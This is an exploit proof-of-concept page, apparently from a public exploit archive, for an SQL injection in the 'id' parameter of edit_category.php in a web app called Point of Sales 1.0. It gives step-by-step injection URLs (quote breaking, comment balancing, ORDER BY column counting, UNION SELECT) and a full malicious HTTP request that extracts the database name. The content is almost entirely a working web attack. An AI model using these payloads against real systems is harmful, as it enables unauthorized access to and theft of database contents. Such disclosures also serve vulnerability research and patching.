---
title: "Point of Sales 1.0 - 'id' SQL Injection"
date: 2020-10-22T10:57:56-03:00
draft: false
type: "sql"
platform: "webapps"
---

```html

Proof of Concept:::

Step 1:	Open the URL http://localhost:8081/pos/edit_category.php?id=1

Step 2:	Change the URL http://localhost:8081/pos/edit_category.php?id=1'

Step 3: Try to balance the query http://localhost:8081/pos/edit_category.php?id=1'--+

Step 4: Find the number of columns http://localhost:8081/pos/edit_category.php?id=1' order by 1,2--+

Step 5: Find which columns are visible http://localhost:8081/pos/edit_category.php?id=-1%27%20UNION%20Select%201,2--+


Malicious Request:::

GET /pos/edit_category.php?id=-1%27%20UNION%20Select%201,database()--+ HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=q9kusr41d3em013kbe98b701id
Upgrade-Insecure-Requests: 1

Gives database name *sourcecodester_posdb*


```html